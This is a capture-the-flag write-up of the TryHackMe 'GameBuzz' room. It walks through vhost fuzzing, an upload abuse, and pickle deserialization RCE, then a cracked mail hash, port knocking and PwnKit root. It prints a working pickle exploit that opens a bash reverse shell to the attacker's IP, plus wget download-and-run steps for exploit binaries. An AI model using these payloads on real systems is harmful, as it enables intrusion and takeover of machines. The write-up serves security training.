# TryHackMe — GameBuzz Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-GameBuzz-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)
![Status](https://img.shields.io/badge/Status-Pwned-brightgreen?style=for-the-badge)

> **Platform:** [TryHackMe](https://tryhackme.com)  
> **Room:** GameBuzz  
> **OS:** Ubuntu 18.04 (Linux 4.15)  
> **Difficulty:** Medium  

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [1. Reconnaissance — Nmap](#1-reconnaissance--nmap)
- [2. Web Enumeration — Main Site](#2-web-enumeration--main-site)
- [3. Virtual Host Configuration](#3-virtual-host-configuration)
- [4. Subdomain Fuzzing — ffuf](#4-subdomain-fuzzing--ffuf)
- [5. Directory Fuzzing on dev.incognito.com](#5-directory-fuzzing-on-devincognitocom)
- [6. File Upload Page Discovery](#6-file-upload-page-discovery)
- [7. Understanding the Upload Mechanism — Burp Suite](#7-understanding-the-upload-mechanism--burp-suite)
- [8. Python Pickle Deserialization RCE](#8-python-pickle-deserialization-rce)
- [9. Initial Shell — www-data](#9-initial-shell--www-data)
- [10. Post-Exploitation Enumeration](#10-post-exploitation-enumeration)
- [11. Credential Discovery — /var/mail](#11-credential-discovery--varmail)
- [12. Cracking the MD5 Hash](#12-cracking-the-md5-hash)
- [13. Port Knocking — knockd](#13-port-knocking--knockd)
- [14. Lateral Movement — su dev2](#14-lateral-movement--su-dev2)
- [15. Privilege Escalation — PwnKit CVE-2021-4034](#15-privilege-escalation--pwnkit-cve-2021-4034)
- [16. Root Flag](#16-root-flag)
- [Flags](#flags)
- [Tools Used](#tools-used)
- [Key Takeaways](#key-takeaways)

---

## Attack Chain Summary

```
Nmap → Port 80 (Apache 2.4.29)
  └─► Virtual host fuzzing (ffuf) → dev.incognito.com
        └─► Directory fuzzing → /secret/upload/
              └─► Pickle deserialization RCE (file upload + /fetch endpoint)
                    └─► Shell as www-data
                          └─► /var/mail/dev1 → MD5 hash → cracked: "Password"
                                └─► knockd config → port knock 5020,6120,7340
                                      └─► su dev2 (no password needed)
                                            └─► SUID pkexec → PwnKit CVE-2021-4034
                                                  └─► ROOT
```

---

## 1. Reconnaissance — Nmap

Starting with a standard service version scan against the target:

```bash
nmap -sV -v 10.113.131.66
```

![Nmap scan results](screenshots/01_nmap_scan.png)

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | **filtered** | ssh | — |
| 80/tcp | **open** | http | Apache httpd 2.4.29 (Ubuntu) |

**Observations:**
- SSH on port 22 is filtered — blocked by firewall, not accessible directly
- Only HTTP on port 80 is exposed — this is our attack surface
- Apache 2.4.29 on Ubuntu (later identified as 18.04 with kernel 4.15)

---

## 2. Web Enumeration — Main Site

Navigating to `http://10.113.131.66` reveals a gaming company website called **JACKPIRO**:

![JACKPIRO gaming website](screenshots/02_website_jackpiro.png)

The site advertises an "Amazing 3D Game" with Lorem Ipsum placeholder text. Navigation includes: `GAME`, `SOFTWARE`, `ABOUT`, `TESTIMONIAL`, `CONTACT`, and `Login`/`Signup` buttons. The connection is plain HTTP (no HTTPS).

---

## 3. Virtual Host Configuration

The server likely uses **virtual hosting** — serving different content based on the `Host:` header. We add the target IP to `/etc/hosts` with the hostname discovered from the site context:

```bash
sudo nano /etc/hosts
```

```
10.113.131.66    incognito dev.incognito.com
```

![/etc/hosts with incognito hostname added](screenshots/03_etc_hosts.png)

This allows us to reach the server using hostnames instead of just the raw IP.

---

## 4. Subdomain Fuzzing — ffuf

We fuzz for virtual hosts by injecting wordlist entries into the `Host:` header. The `-fs 20637` flag filters out the default response (main site = 20637 bytes), leaving only unique responses:

```bash
ffuf -u http://10.113.131.66/ \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -H "Host: FUZZ.incognito.com" \
     -fs 20637
```

![ffuf virtual host discovery — dev subdomain found](screenshots/04_ffuf_vhost.png)

| Subdomain | Status | Size | Duration |
|-----------|--------|------|----------|
| `dev` | **200** | 57 bytes | 90ms |

**Finding:** `dev.incognito.com` returns a unique 57-byte response — a hidden developer subdomain. We add it to `/etc/hosts` to access it in the browser.

---

## 5. Directory Fuzzing on dev.incognito.com

With `dev.incognito.com` accessible, we enumerate its directories:

```bash
ffuf -u http://dev.incognito.com/FUZZ \
     -w /usr/share/wordlists/dirb/big.txt \
     -ic -c
```

![ffuf directory fuzzing on dev subdomain](screenshots/05_ffuf_dirs.png)

| Path | Status | Size | Notes |
|------|--------|------|-------|
| `.htpasswd` | 403 | 282 | Forbidden |
| `.htaccess` | 403 | 282 | Forbidden |
| `robots.txt` | **200** | 32 | Readable |
| `secret` | **301** | 323 | **Redirect — investigate!** |
| `server-status` | 403 | 282 | Forbidden |

The `secret` directory with a 301 redirect is immediately interesting. Following it leads to `/secret/upload/`.

---

## 6. File Upload Page Discovery

Navigating to `http://dev.incognito.com/secret/upload/` reveals a minimal file upload form:

![Dev file upload page](screenshots/06_upload_page.png)

> **"Upload a File: [Browse...] [Start Upload]"**

Viewing the page source shows the form POSTs to `script.php`. A quick `GET` request to `script.php` returns:

```
Bruhh!
```

This confirms the endpoint only processes `POST` requests with actual file uploads. The key question is: what does it do with the uploaded files?

---

## 7. Understanding the Upload Mechanism — Burp Suite

We intercept requests with Burp Suite to understand the full upload flow.

**Testing a plain text file upload (`test.txt`):**

![Burp Suite — test.txt upload request and response](screenshots/13_burp_test_upload.png)

Response: `The file test.txt has been uploaded` — server accepts any file type, no restrictions.

**Testing the actual shell payload upload:**

![Burp Suite — shell payload upload request/response](screenshots/12_burp_upload_response.png)

The Burp request shows the raw multipart form data with our pickle payload. Response confirms: `The file shell has been uploaded`.

**Discovering the /fetch endpoint:**

While investigating the main application at `http://10.10.162.158`, Burp reveals a `/fetch` endpoint that accepts a JSON body:

![Burp Suite — /fetch endpoint with object path](screenshots/11_burp_fetch_request.png)

```json
POST /fetch HTTP/1.1
Host: 10.10.162.158
Content-Type: application/json

{"object":"/var/upload/shell"}
```

This is the trigger — the server reads the file at the given path and **deserializes it with Python's pickle module**. This is the RCE vector.

---

## 8. Python Pickle Deserialization RCE

### What is Pickle Deserialization RCE?

Python's `pickle` module serializes/deserializes Python objects. When a `pickle`-serialized object is loaded, Python calls the `__reduce__` method automatically — making it possible to embed **arbitrary OS commands** that execute upon deserialization. There is no safe way to deserialize untrusted pickle data.

### Reference Exploit

We first examine a reference implementation of the attack:

![Reference exploit.py from another writeup](screenshots/07_exploit_py_reference.png)

### Writing Our Exploit

We create `exploit.py` with our own listener IP and port:

```bash
nano exploit.py
```

![exploit.py in nano editor](screenshots/08_exploit_py_nano.png)

```python
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ("bash -c 'bash -i >& /dev/tcp/192.168.152.250/7777 0>&1'")
        return os.system, (cmd,)

pickle.dump(RCE(), open("shell", "wb"))
```

When deserialized, the `__reduce__` method fires automatically and executes our reverse shell command.

### Generating the Payload

```bash
python3 exploit.py
ls -la
```

![Shell binary created — 93 bytes](screenshots/10_shell_binary_created.png)

The exploit generates a binary file `shell` (93 bytes) containing our malicious serialized object.

```bash
python3 exploit.py && ls -la
```

![exploit.py run successfully, shell file confirmed](screenshots/09_exploit_py_saved.png)

---

## 9. Initial Shell — www-data

### Upload the Payload

```bash
curl -X POST http://dev.incognito.com/secret/upload/script.php \
  -F "the_file=@shell" \
  -F "submit=Start Upload"
# Response: The file shell has been uploaded
```

### Start the Listener

```bash
penelope -p 7777
```

### Trigger Deserialization via /fetch

```bash
curl -X POST http://10.113.131.66/fetch \
  -H "Content-Type: application/json" \
  -d '{"object":"/var/upload/shell"}'
```

The server reads `/var/upload/shell`, deserializes it with pickle, and our `__reduce__` method fires — sending a reverse shell to our listener:

![Penelope receives reverse shell as www-data](screenshots/15_shell_received.png)

**Shell obtained:** `www-data@incognito` with PTY upgrade via Python3. We're inside the machine.

---

## 10. Post-Exploitation Enumeration

### Failed Privilege Escalation Attempt — DirtyFrag

We try a kernel exploit (DirtyFrag) but the kernel is not vulnerable:

```bash
cd /tmp
wget http://192.168.152.250:8888/exp
chmod +x exp
./exp
```

![DirtyFrag kernel exploit fails — rc=4](screenshots/16_dirtyfrag_fail.png)

```
dirtyfrag: failed (rc=4)
```

Kernel 4.15 is not vulnerable to this particular exploit. We need to enumerate further.

### Checking SSH Config

We investigate why SSH is inaccessible and examine the configuration:

```bash
cat /etc/ssh/sshd_config | grep -i "PasswordAuth\|PermitRoot\|AllowUsers"
```

![sshd_config showing PasswordAuthentication yes](screenshots/20_sshd_config.png)

Password authentication is enabled but SSH itself is filtered by firewall. Note `www-data` is in group `nosu` which blocks `su` usage.

---

## 11. Credential Discovery — /var/mail

Running Linpeas for automated enumeration, it highlights mail files:

![Linpeas output highlighting /var/mail/dev1](screenshots/18_linpeas_mail.png)

We check the mail spool directly:

```bash
cd /var/mail
ls -la
cat dev1
```

![/var/mail — cat dev1 reveals password hash](screenshots/17_var_mail_password.png)

Full mail content:

```
Hey, your password has been changed, dc647eb65e6711e155375218212b3964.
Knock yourself in!
```

![/var/mail cat dev1 — full output](screenshots/19_mail_cat_dev1.png)

Two critical pieces of information:
1. **A hash:** `dc647eb65e6711e155375218212b3964`
2. **A hint:** "Knock yourself in!" — this is a reference to **port knocking**

---

## 12. Cracking the MD5 Hash

The hash is submitted to [CrackStation](https://crackstation.net):

| Hash | Type | Result |
|------|------|--------|
| `dc647eb65e6711e155375218212b3964` | MD5 | **Password** |

The plaintext password for `dev1` is simply: **`Password`**

---

## 13. Port Knocking — knockd

The phrase "Knock yourself in!" is a direct hint at **port knocking** — a method where sending TCP SYN packets to a specific sequence of ports temporarily opens a firewall rule. We find the configuration:

```bash
cat /etc/knockd.conf
```

![knockd.conf showing port sequence 5020,6120,7340](screenshots/21_knockd_conf.png)

```ini
[openSSH]
    sequence    = 5020, 6120, 7340
    seq_timeout = 15
    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn

[closeSSH]
    sequence    = 9000, 8000, 7000
    seq_timeout = 15
    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
    tcpflags    = syn
```

**To open SSH:** knock ports `5020 → 6120 → 7340` within 15 seconds.  
**To close SSH:** knock ports `9000 → 8000 → 7000`.

From our Kali machine:

```bash
knock 10.114.141.146 5020 6120 7340
ssh dev1@10.114.141.146
# Password: Password
```

---

## 14. Lateral Movement — su dev2

While SSH access to `dev1` proved difficult due to version compatibility issues with our custom sshd setup, we discovered that `su dev2` works without a password from the `www-data` session:

```bash
su dev2
id
# uid=1000(dev2) gid=1000(dev2) groups=1000(dev2),24(cdrom),30(dip),46(plugdev),1002(nosu)
```

### User Flag

```bash
cat /home/dev2/user.txt
```

**User flag obtained!** 🎉

### Checking sudo Privileges

```bash
sudo -l
# [sudo] password for dev2: 
# Sorry, try again.
```

Password for `dev2` is unknown and `sudo` is not available without it.

---

## 15. Privilege Escalation — PwnKit CVE-2021-4034

### SUID Enumeration

```bash
find / -perm -4000 2>/dev/null
```

Key finding: `/usr/bin/pkexec` has the SUID bit set.

### PwnKit

`pkexec` is vulnerable to **CVE-2021-4034 (PwnKit)** — a memory corruption vulnerability in Polkit's `pkexec` utility that allows any local unprivileged user to gain full root privileges. It affects virtually all Linux distributions that ship `pkexec`.

- **CVE:** [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)  
- **Exploit:** [https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

**On Kali — clone and serve:**

```bash
git clone https://github.com/ly4k/PwnKit
cd PwnKit
python3 -m http.server 8888
```

![Cloning PwnKit on Kali and serving via HTTP](screenshots/25_pwnkit_git_clone.png)

![HTTP server serving PwnKit binary](screenshots/22_pwnkit_download_kali.png)

**On the target — download and execute:**

```bash
cd /tmp
wget http://192.168.152.250:8888/PwnKit
chmod +x PwnKit
./PwnKit
```

![PwnKit downloaded successfully on target](screenshots/23_pwnkit_wget_target.png)

![Root shell obtained via PwnKit](screenshots/24_root_shell.png)

```
uid=0(root) gid=0(root) groups=0(root),...
```

**We are root!**

---

## 16. Root Flag

```bash
cd /root
ls
cat root.txt
```

![Root flag](screenshots/26_root_flag.png)

---

## Flags

| Flag | Value |
|------|-------|
| 🚩 User | `d14def35ed0bd914c1c5881fa0fa8090` |
| 🚩 Root | `9dcb607e31348671de36b9eb7446cb59` |

---

## Tools Used

| Tool | Purpose | Link |
|------|---------|------|
| Nmap | Port scanning & service detection | https://nmap.org |
| ffuf | Virtual host & directory fuzzing | https://github.com/ffuf/ffuf |
| Burp Suite | HTTP traffic interception & analysis | https://portswigger.net/burp |
| Python (pickle) | Crafting deserialization RCE payload | https://docs.python.org/3/library/pickle.html |
| curl | File upload & /fetch endpoint trigger | https://curl.se |
| Penelope | Reverse shell handler with PTY upgrade | https://github.com/brightio/penelope |
| CrackStation | MD5 hash cracking | https://crackstation.net |
| knock | Port knocking client | http://www.zeroflux.org/projects/knock |
| PwnKit (ly4k) | CVE-2021-4034 local privilege escalation | https://github.com/ly4k/PwnKit |

---

## Key Takeaways

**1. Virtual Host Enumeration is Critical**  
The main site gave nothing away. The hidden `dev.incognito.com` subdomain was the entire attack path. Always fuzz vhosts, not just directories.

**2. Python Pickle is Inherently Unsafe for Untrusted Input**  
`pickle.loads()` on user-controlled data is equivalent to remote code execution. Use JSON or other safe formats for any externally supplied serialized data.

**3. Sensitive Data Leaks in /var/mail**  
Credentials left in system mail spools are a common finding in post-exploitation. Always check `/var/mail/` and `/var/spool/mail/`.

**4. Port Knocking — Security Through Obscurity**  
Port knocking hides services from casual scanners but provides no real security once an attacker has filesystem access. The sequence is trivially readable from `knockd.conf`.

**5. PwnKit (CVE-2021-4034)**  
A critical unpatched `pkexec` with SUID is game over on most Linux systems. Patch Polkit, or remove the SUID bit from `pkexec` if it's not needed: `chmod 0755 /usr/bin/pkexec`.
